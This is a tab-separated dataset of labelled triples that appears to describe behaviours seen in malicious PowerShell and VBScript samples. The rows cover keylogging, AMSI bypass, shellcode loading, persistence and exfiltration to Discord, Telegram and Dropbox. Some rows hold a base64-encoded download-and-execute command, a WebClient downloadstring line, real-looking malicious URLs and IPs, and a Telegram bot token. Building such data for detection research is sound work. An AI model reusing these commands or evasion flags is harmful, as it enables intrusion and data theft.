InfoKey	FUNCTION	Collect	Keylogging	PVI
The script	SUB	Create	xrbnzmj.ps1	EXE
PDF.vbs	FILE	Execute	1.bat	EXE
The script	SUB	Execute	IWR -UseBasicParsing	IWR COMMAND
GetObject method	FUNCTION	Access	file from suspicious string	DATA
The script	SUB	Creates	C:\ProgramData\Document\x.ps1	EXE
JZKPPKGTHBOIPSRKOCOKSH.vbs	EXE	Create	RUCXFGHJUCVOFVUZVIPNCG.ps1	PS COMMAND
RUCXFGHJUCVOFVUZVIPNCG.ps1	PS COMMAND	Have Name	random string	RANDOM STRING
1.bat	EXE	Have	POWERSHELL -NOP -WIND HIDDEN -eXEC	PS COMMAND
POWERSHELL -NOP -WIND HIDDEN -eXEC	PS COMMAND	Have	-NOP -WIND HIDDEN -eXEC	BYPASS PARAMETER
The script	SUB	Execute	encoded string	DATA
The script	SUB	Read	'readme.txt'	FILE
The script	SUB	Define	getit	FUNCTION
The script	SUB	Disable	event provider for PowerShell tracing	DEFENDER
The script	SUB	Download	r.exe	EXE
The script	SUB	Download	CorSym.ps1	EXE
CodeDom function	FUNCTION	Use	System.CodeDom.Compiler	NAMESPACE
The script	SUB	Create	text file	FILE
$oven	VAR	Is	Base64 encoded string	OBF
msi.dll	DLL	Have	A scanner function	FUNCTION
Multiple files	FILE	Saved	ProgramData folder	ProgramData PATH
Chat ID	PARAMETER	Have	-1002168553106	STRING
The script	SUB	Execute	.NET compiler (aspnet_compiler.exe)	EXE
The script	SUB	Have	string obfuscation	OBF
u.exe	EXE	Saved	c:\windows\inf	PATH
PowerShell execution policies	PS COMMAND	Include	-Ep bypass	BYPASS PARAMETER
The script	SUB	Have	-NoProfile	BYPASS PARAMETER
The script	SUB	Define	C# class	Class
The script	SUB	Have	$XOFWKIVDXBZSKRBOPXCOYL	OBF
scheduled task 'TvMusic2'	TASK	Start	January 1, 2023	DATE
The script	SUB	Have	obfuscated code	OBF
The script	SUB	Connect	http://185.244.20.38	URL
func_get_delegate_type	FUNCTION	Create	delegate type	DELEGATE
decrypted byte sequence	DATA	CopiedTo	allocated memory	MEMORY
The script	SUB	Download	RegSvcs.exe	EXE
The script	SUB	Connect	remote server	ACTION
The script	SUB	Create	'runner.exe'	EXE
The script	SUB	Use	Base64 Encoding and Obfuscation	OBF
The script	SUB	Execute	Start-Sleep 1000	SLEEP
byte array	DATA	Saved	XX.PS1	EXE
The script	SUB	Obfuscate	string manipulation (-replace '', '')	OBF
The script	SUB	Disable	Script Scanning	DEFENDER
PowerShell command	PS COMMAND	Have	base64 encoded string	PAYLOAD
g.exe	EXE	Saved	c:\windows\help	PATH
VBScript file	EXE	Execute	PowerShell command	EXE
The script	SUB	Download	'adobe.zip'	COMPRESSED FILE
The script	SUB	Collect	Session information	PVI
The script	SUB	Delete	PowerShell-related files	EXE
The script	SUB	Have	long byte sequences	OBF
The script	SUB	Create	'microsoft' file	FILE
The script	SUB	Have	Obfuscated Code	OBF
The script	SUB	Execute	1.bat	EXE
The script	SUB	Check	Virtual machine environments	Virtual machine environment
scheduled task 'TvMusic2'	TASK	Run	TvMusic.vbs	EXE
IEX expression	COMMAND	Execute	decoded Base64 string	DATA
The script	SUB	Have	obfuscated code	OBF EXE
Invoke-WebRequest	COMMAND	Have	-Uri	URL
VirtualAlloc	WAPI	Create	Memory Space	MEMORY
The script	SUB	Run	in a non-interactive mode	NON-INTERACTIVE MODE
The script	SUB	Compute	MD5 Haveh of BIOS serial number	OBF
new thread	THREAD	Execute	x86 assembly code	ASM
The script	SUB	Connect	Telegram bot	EXTERNAL SERVICE
Invoke-WebRequest	COMMAND	Have	-UseBasicParsing	UseBasicParsing PARAMETER
The script	SUB	Execute	files from an unknown URL	EXE
files from an unknown URL	EXE	Hosted	an unknown URL	URL
Invoke-Expression	COMMAND	Have	Base64 Encoded Payload	OBF PAYLOAD
The script	SUB	Collect	region	PVI
the thread created by CreateThread	THREAD	Load	shellcode	CODE
The script	SUB	Decode	Base64 Encoded Data	OBF
Report.ps1	EXE	Decode	hexadecimal strings	OBF
VirtualAlloc	WAPI	Create	executable memory	MEMORY
directory in C:\ProgramData\WD	ProgramDATA PATH	Have	XX.bat	EXE
encoded data	OBF	DECOMPRESSED	data	data
The script	SUB	Obfuscate	vgit function	CODE
go function	FUNCTION	Decode	hexadecimal string	OBF
The script	SUB	Load	assembly (DLL)	assembly DLL
The script	SUB	Execute	x.ps1	EXE
The script	SUB	Create	VBScript coinmarketcap.vbs	EXE
The script	SUB	Have	obfuscated strings	OBF
The script	SUB	Sleep	1	TIME
The script	SUB	Use	Encryption and Decryption functions	Encryption/Decryption FUNCTION
C:\ProgramData\YWGCNHBTTYGDVSHYYNDAIO	ProgramData PATH	Hosted	YWGCNHBTTYGDVSHYYNDAIO.vbs	EXE
The script	SUB	Use	delegate for memory address	DELEGATE
The script	SUB	Encrypt	payloads in Report.ps1	OBF
Invoke-Expression	COMMAND	Have	IEX	PARAMETER
The script	SUB	Write	ETC.vbs	EXE
Win32VirtualAlloc function	WAPI	Allocate	memory	MEMORY
Generated PowerShell script	PS COMMAND	Have	-Exec Bypass	BYPASS PARAMETER
PowerShell	EXE	Have	-ExecutionPolicy	Bypass PARAMETER
The script	SUB	Rename	NSudo.exe	EXE
scheduled task	TASK	Execute	VBScript file at C:\Users\Public\Smart.vbs	EXE
The script	SUB	Have	$VPUCVZHVUGVJLCHaveROBTT	OBF
Add.bat	EXE	Execute	PowerShell script	EXE
ROBOCOPY	COMMAND	Access	Documents folder and subdirectories	RECURRENT PATH
The script	SUB	Create	scheduled task 'Express'	TASK
The script	SUB	Connect	\\posters-dial.com@9809\DavWWWRoot	URL
The script	SUB	Collect	.txt, .jpg, .env, .jpeg, .doc, .avi, .mp4 files	TEXT IMG FILE
The script	SUB	Decode	base64 string	OBF
The script	SUB	Use	bitwise XOR operation	XOR ACTION
The script	SUB	Access	user's clipboard	PVI
The script	SUB	Create	log.vbs	EXE
The script	SUB	Load	dynamic assembly	ASSEMBLY
PowerShell instance	PS COMMAND	Have	hidden window	BYPASS PARAMETER
VsLabsData.ps1	EXE	Execute	payload	OBF
The script	SUB	Have	-win hid	BYPASS PARAMETER
The script	SUB	Collect	local IP addresses	PVI
The script	SUB	Create	C:\ProgramData\YWGCNHBTTYGDVSHYYNDAIO	ProgramData PATH
$YSJXX	OBF	Have	Base64 Encoded Payload	PVI
The script	SUB	Create	Run.BAT	EXE
Unusual file paths	PATH	Refer to	C:\Windows\System32	PATH
$env:computername-Capture.png	FILE	UploadedTo	Dropbox account	EXTERNAL SERVICE
Add-Type cmdlet	COMMAND	Bypass	script block logging	script block logging ACTION
The script	SUB	Check	c:\windows\system32\vmtools.dll	FILE
TrlUqMsx	VALUE	Points to	log-analyzer.exe	EXE
The script	SUB	Use	mute argument	mute argument
garold.zip	COMPRESSED FILE	Extract	garold.dll	EXE
VirtualAlloc	WAPI	Create	executable memory	MEMORY
The script	SUB	Encrypt	files on the system	FILE
The script	SUB	Set	registry key HKCU:\Software\Microsoft\Windows\CurrentVersion\Run	AUTORUN REGKEY
Decoded string	FILE	Have	Series of IP addresses and ports	IP
VBScript file	EXE	Have	obfuscated strings like 'WSc%.#ll' and 'She', 'ript'	OBF
The script	SUB	Have	-nop	BYPASS PARAMETER
The script	SUB	Execute	the downloaded file	EXE
IEX	COMMAND	Execute	obfuscated string	OBF
log.vbs	EXE	Saved	C:\ProgramData\log	ProgramData PATH
System information	PVI	Have	user name	PVI
The script	SUB	Handle	exceptions	ERR
The script	SUB	Save	$env:USERPROFILE\AppData\Local\Temp\$env:computername-Capture.png	FILE
$env:USERPROFILE\AppData\Local\Temp\$env:computername-Capture.png	FILE	Saved	Userprofile\AppData	USER APPDATA PATH
PDF	FILE	Hosted	http://www.bluiblmaxxlasiblr.com/rh/List%20of%20riblquiribld%20itiblms%20and%20siblrvicibls.pdf	URL
VirtualAlloc	WAPI	Have	lpAddress: 0	ADDRESS PARAMETER
The script	SUB	Execute	a file	FILE
The script	SUB	Use	-win hid	BYPASS PARAMETER
The script	SUB	Have	System.Windows.Forms	NAMESPACE
PowerShell script (Nothing.ps1)	EXE	Execute	a method named "Execute"	FUNCTION
kernel32.dll	DLL	Have	WaitForSingleObject	WAPI
base64 string	OBF	ConvertedTo	bytes	DATA
The script	SUB	Decode	$uBdD	OBF
The script	SUB	Have	$shell	OBF
The script	SUB	Execute	WindowsBase	CODE
The script	SUB	Use	function pointer	POINTER
The script	SUB	Execute	Get-Location	COMMAND
Get-Location	COMMAND	Collect	Location	PVI
The script	SUB	Have	comments in multiple languages	Comments in multiple languages
file.zip	FILE	Hosted	http://flexiblemaria.com/iinkqrwu	URL
The script	SUB	Execute	netsh	COMMAND
the script	SUB	Use	catch exceptions	ERR
key presses	PVI	Include	passwords and sensitive information	PVI
The script	SUB	Create	Files	FILE
The script	SUB	Access	user's clipboard	PVI
encrypted files	FILE	Append	'.psr' extension	EXTENSION
BT.ps1	EXE	Written	disk	PATH
The script	SUB	Collect	recovery key	PVI
The script	SUB	Extract	'adobe.zip'	COMPRESSED FILE
CreateThread	WAPI	Create	a thread	THREAD
getit	FUNCTION	Download	PDF file	FILE
The script	SUB	Execute	Sleep commands	SLEEP
The script	SUB	Have	encoded command	OBF
The script	SUB	Allocate	2048 bytes	MEMORY
The script	SUB	Create	Report.ps1	EXE
The script	SUB	Define	dischat function	FUNCTION
The script	SUB	Generate	access token	TOKEN
NHCIYUEGJZVIPHCJBJRIOD.ps1	EXE	Saved	C:\ProgramData\QPXCNKQPGRJWIWPIQLPDOP	PATH
VirtualAlloc	WAPI	Create	Memory	MEMORY
The script	SUB	Create	$env:TEMP\<random_string>.exe	EXE
.lnk file	FILE SHORCUT	Set	Launch on startup	AUTORUN
The script	SUB	Execute	decoded byte sequence	BYTE ARRAY PAYLOAD
The script	SUB	Create	JZKPPKGTHBOIPSRKOCOKSH.bat	EXE
byte arrays	DATA	Joined	executed payload	DATA
The script	SUB	Use	Out-File cmdlet	COMMAND
The script	SUB	Execute	remote code	REMOTE CODE
delegate	DELEGATE	Execute	IEX	IEX COMMAND
The script	SUB	Connect	aAB0AHQAcAA6AC8ALwAxADIALgA0ADgALgAxADgANgAuADkAOAA6ADQANAAzAA==	URL
getit function	FUNCTION	Download	Irs Tax Status.pdf	FILE
The script	SUB	Use	GetProcAddress	WAPI
scheduled task	TASK	Execute	C:\ProgramData\QYZZDAOKPZUJIKAFEZWZDV\QYZZDAOKPZUJIKAFEZWZDV.vbs	EXE
The script	SUB	Have	while (1){...}	LOOP
The script	SUB	Access	C:\Windows\Mi$!&!!^crosoft.NET\Frame$!&!!^work\v4.0.30319\aspnet_compiler.exe	EXE
191.232.181.180	IP ADDRESS	Open	Port 443	PORT
$MHilluFsD	OBF	Decoded	payload	PAYLOAD
The script	SUB	Modify	amsiInitFailed field	DEFENDER
The script	SUB	Create	delegate	DELEGATE
encoded strings	OBF	Decoded	ReturnShellAlosh function	FUNCTION
The script	SUB	Download	shove.ke	EXE
The script	SUB	Create	$BB	FILE WITH RANDOM NAME
Run.BAT	EXE	Hosted	C:\Users\Public\Run\	PATH
The script	SUB	Disable	Anti-Malware Scan Interface (AMSI)	DEFENDER
The script	SUB	Execute	unknown code	CODE
PowerShell command	EXE	Execute	decoded base64 string	OBF PAYLOAD
marqueesInvariance.txt	FILE	Saved	'C:\users\public'	PATH
WD.vbs	EXE	Saved	directory in ProgramData	ProgramData PATH
The script	SUB	Create	C:\ProgramData\MiniTool	ProgramData PATH
Received commands	COMMAND	Send	remote server	HOST
func_get_proc_address	FUNCTION	Retrieve	function address in kernel32.dll	MEM_ADDRESS
system information	PVI	Include	operating system	PVI
The script	SUB	Execute	cmd.exe	EXE
The script	SUB	Execute	malicious.exe	EXE
PowerShell with -ExecutionPolicy Bypass	PS COMMAND	Have	-ExecutionPolicy	Bypass PARAMETER
script	SUB	Write	TvMusic.vbs	EXE
The script	SUB	Reference	Microsoft.VisualBasic	VB LIBRARY
The script	SUB	Use	HH	CLASS
The script	SUB	Create	new script block	FILE
The script	SUB	Use	start-sleep	SLEEP
EPzLaSUIf.bin	EXE	Hosted	http://adnmarketing.ec/robostar.php	URL
The script	SUB	Use	kernel32.dll	LIBRARY
PowerShell script	PS COMMAND	Use	System.Windows.Forms	System.Windows.Forms WAPI
The script	SUB	Create	VBS script	EXE
scheduled task	TASK	Execute	Pictures.vbs	EXE
QPXCNKQPGRJWIWPIQLPDOP.vbs	EXE	Saved	C:\ProgramData\QPXCNKQPGRJWIWPIQLPDOP	ProgramData PATH
The script	SUB	Connect	remote server	REMOTE HOST
The script	SUB	Create	GTZYVDQNGLKWWAYUCNKYHE.bat	EXE
kms8.msguides.com	URL	Hosted	public Key Management Service (KMS)	EXTERNAL SERVICE
The script	SUB	Use	PowerShell Compression	COMPRESSION API
Microsoft.VisualBasic.Interaction.CallByname	WAPI	Inject	.NET Assembly	NET ASSEMBLY
The script	SUB	Download	'ngrok.exe'	EXE
The script	SUB	Use	Base64 Encoding	OBF
The script	SUB	Use	mutex	MUTEX
The script	SUB	Execute	start-sleep -Seconds 15	SLEEP
The script	SUB	Have	-Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AbABvAGcAaQBuAGwAaQBuAGUALgBkAG8AcAAvAGkAbgBkAGUAeAAuAHAAaABwACIAKQA=	OBF PARAMETER
The script	SUB	Use	HzGaJsAt function	FUNCTION
XX.vbs	EXE	Saved	directory in ProgramData	PATH	
The script	SUB	Create	HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run	AUTORUN REGKEY
bat files	EXE	Hosted	C:\ProgramData\WD	ProgramData PATH	
data	data	Sent	webhook URL	EXTERNAL SERVICE
The script	SUB	Drop	vbs files	EXE
The script	SUB	Send	system information	PVI
The script	SUB	Write	$env:TMP + '\cpy'	TEMP PATH
The script	SUB	Check	running as an administrator	running as an administrator	
The script	SUB	Use	System.Convert.ToInt32	System.Convert.ToInt32 COMMAND
2.tar.gpg	FILE	Hosted	https://republishnow.com/2.tar.gpg	URL
PowerShell command	EXE	Download	an executable file	EXE
The script	SUB	Use	string manipulation	OBF
The script	SUB	Collect	system uptime	PVI
PowerShell command	PS COMMAND	Execute	iex	COMMAND
PasswordVault class	FUNCTION	Collect	stored passwords	PVI
The script	SUB	Define	byte array $txRbsuvSoU	PAYLOAD PARAMETER
This script	SUB	Execute	RegSvcs.exe	EXE
The script	SUB	Collect	GPO/OU data	PVI
The script	SUB	Access	data from a stream	DATA
stored passwords	PVI	Saved	C:\Users\Owner\AppData\Local\Temp\tmpE69A.tmp	FILE
The script	SUB	Create	PowerShell ISE shortcut	EXE SHORTCUT
The script	SUB	Have	base64-encoded data	OBF
VBScript file (BT.vbs)	EXE	Execute	PowerShell script (BT.ps1)	EXE
InvokeWithEvasion	COMMAND	Check	the script in a 32-bit process if the system is 64-bit	CONDITION
The script	SUB	Terminate	'cmd'	PROCESS
Report.ps1	EXE	Decode	second byte sequence	OBF
The script	SUB	Terminate	wscript	PROCESS
oghygb4	FUNCTION	Use	Base64 Encoding	OBF
The script	SUB	Create	WD.bat	EXE
scheduled task	TASK	Execute	every 2 minutes	FREQUENCY
function D4FD5C5B9266824C4EEFC83E0C69FD3FAA	FUNCTION	Decode	Base64 string	OBF
Clipboard data	PVI	SentTo	Discord webhook	EXTERNAL SERVICE
The script	SUB	Create	thukanthukai.~!!@@!!@@!!~	FILE
executables and DLLs	EXE	Hosted	update-ledger.net	EXTERNAL URL
The script	SUB	Download	4th.zip	COMPRESSED FILE
WD.PS1	EXE	Create	XX.PS1	EXE
screenshots	PVI	SentTo	Dropbox	EXTERNAL SERVICE
$uZjpAzXjSE	PATH	Have Name	random string	RANDOM STRING
Start-Sleep	COMMAND	Have	7 seconds	TIME
The script	SUB	Download	zip file	COMPRESSED FILE
byte array	DATA	CopiedTo	memory	MEMORY
The script	SUB	Use	several .NET assemblies	NET ASSEMBLY
The script	SUB	Execute	Send-MailMessage	Send-MailMessage COMMAND
The script	SUB	Execute	Infinite Loop	LOOP
byte array	DATA	CopiedTo	memory location	MEMORY
The script	SUB	Have	$ATUBRDUAVDPPRNHXEYSCSW	OBF
The script	SUB	Load	PresentationCore assembly	PresentationCore assembly CODE
The script	SUB	Delete	result files	FILE
The script	SUB	Execute	encoded x86 assembly code	x86 assembly CODE
The script	SUB	Change	registry key	REGKEY
Microsoft.bat	EXE	Saved	C:\ProgramData\Document	PATH
The script	SUB	Execute	New-Object Net.WebClient	Net.WebClient COMMAND
The script	SUB	Connect	192.168.74.100:55555	IP
the script	SUB	Define	qqgame_tim	FUNCTION
Bot Token	BOT TOKEN	Have	7484009227:AAEvngzrIKFNFdfSqECzWAqbnB5IXk8pjVo	RANDOM STRING
The script	SUB	Create	startup entries	REGKEY
Isass.exe	EXE	Saved	C:\ProgramData\MicrosoftCorporation\Windows\System32\	ProgramData PATH
'leUafP.dat'	DATA	Hosted	temp folder	TEMP PATH
IEX	COMMAND	Execute	a downloaded file	FILE
1.bat	EXE	Execute	PowerShell script	EXE
The script	SUB	Collect	ARP table data	PVI
iex	COMMAND	Have	-ExecutionPolicy Bypass	PARAMETER
The script	SUB	Execute	a base64 encoded string	OBF
The script	SUB	Create	xx.vbs	EXE
The script	SUB	Execute	AutoIt3.exe	EXE
The script	SUB	Create	New.vbs	EXE
The script	SUB	Have	$e+$r	VAR
The script	SUB	Execute	PowerShell process	PROCESS
The script	SUB	Have	Obfuscated Base64 String	OBF
The script	SUB	Create	$JMdELqYWTpM	OBF
The script	SUB	Allocate	memory in the process space	MEMORY
PowerShell command	EXE	Decode	decoded version of the long byte sequence	DATA
kernel32.dll	LIBRARY	Have	CreateThread	WAPI
The script	SUB	Detect	Virtual Machine	Virtual Machine
Base64 Encoded Command	OBF	Have	powershell.exe -c (new-object net.webclient).downloadstring('http://10.0.0.1/share/update.exe') | PS	COMMAND
powershell.exe -c (new-object net.webclient).downloadstring('http://10.0.0.1/share/update.exe') |	PS COMMAND	Download	http://10.0.0.1/share/update.exe	EXE
http://10.0.0.1/share/update.exe	EXE	Hosted	http://10.0.0.1	URL
username	PVI	SentTo	http://51.132.148.124/brume.php	URL
Report.ps1	EXE	Hosted	user's AppData\Roaming\Logs folder	PATH
The script	SUB	Have	-W Hidden	BYPASS PARAMETER
The script	SUB	Create	TBFLVIISWLYQJRIYEDPLGO.ps1	EXE
The script	SUB	Have	.biden extension	SPECIFIED FILE EXTENSION
The script	SUB	Use	complex string manipulation	OBF
The script	SUB	Use	XOR operation	DECRYPTION
Json files	DATA	SentTo	Discord webhook	WEBHOOK
The script	SUB	Copy	$GSZDYabcRPKLoT	MEMORY
alias "zwert"	COMMAND	Have	command "cu$rpkuao"	PAYLOAD
batch file (JJVXCDAUCHAIHBIEPXDBCS.bat)	EXE	have	elevated privileges	ELEVATED PRIVILEGES
Rundll32	COMMAND	Have	agreeBrood.jpg	FILE
The script	SUB	Execute	NHCIYUEGJZVIPHCJBJRIOD.ps1	EXE
$outputFile	FILE	UploadedTo	$TargetFilePath="/"	PATH
The script	SUB	Create	libraries.ps1	EXE
The script	SUB	Download	'POWERSELL'	URL
The script	SUB	Collect	screenshots	PVI
4th.zip	COMPRESSED FILE	Hosted	http://navitainer.net/4th.zip	URL
The script	SUB	Collect	hardware specifications	PVI
$uBdD	OBF	Have	Base64 Encoding	OBF
The script	SUB	Use	IEX	COMMAND
The script	SUB	Use	base64 encoding	OBF
data	DATA	Extracted	readme.txt	FILE
The script	SUB	Execute	System.Reflection.Assembly	System.Reflection.Assembly WAPI
2.tar	COMPRESSED FILE	Decompressed	2.tar.gpg	FILE
stored passwords	PVI	Write	C:\Users\Owner\AppData\Local\Temp\tmpD994.tmp	TEMP FILE
The script	SUB	Executes	Payload	EXE
The script	SUB	Have	Reflection	Reflection
The script	SUB	Execute	hidden processes	HIDDEN PROCESS
The script	SUB	Wait	180 seconds	TIME
The script	SUB	Decode	base64 data	OBF
The script	SUB	Rename	.sss and .uuu files	FILE
The script	SUB	Download	DLL from external source	EXE
Start-Sleep	COMMAND	Wait	7 seconds	TIME
The script	SUB	Create	client32.exe	EXE
The script	SUB	Download	c.exe	EXE
The script	SUB	Use	System.Reflection.Assembly	System.Reflection.Assembly WAPI
The script	SUB	Have	Obfuscated Strings	OBF
Decoded string	OBF	Have	Multiple URLs	URL
start-sleep	COMMAND	Have	7 seconds	SLEEP
